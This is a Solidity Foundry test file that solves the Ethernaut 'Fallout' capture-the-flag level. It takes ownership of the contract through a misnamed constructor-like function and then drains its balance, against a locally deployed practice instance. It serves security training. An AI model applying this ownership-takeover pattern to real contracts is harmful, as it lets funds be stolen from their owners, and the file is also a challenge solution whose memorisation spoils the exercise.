//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/Fallout/FalloutFactory.sol";

contract FalloutTest is DSTest {
    //state variables we will need 
    Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;
    address attacker = address(0xbabe);

    //Set Up function
    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    //test for hacking level
    function testFalloutHack() public {
        //Level set up
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout falloutAddress = Fallout(payable(levelAddress));

        //Level Attack

        falloutAddress.Fal1out{ value: 1 wei}();
        assertEq(falloutAddress.owner(), attacker);

        falloutAddress.collectAllocations();
        assertEq(address(falloutAddress).balance, 0);

        // Level submission

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(challengeCompleted);



    }
}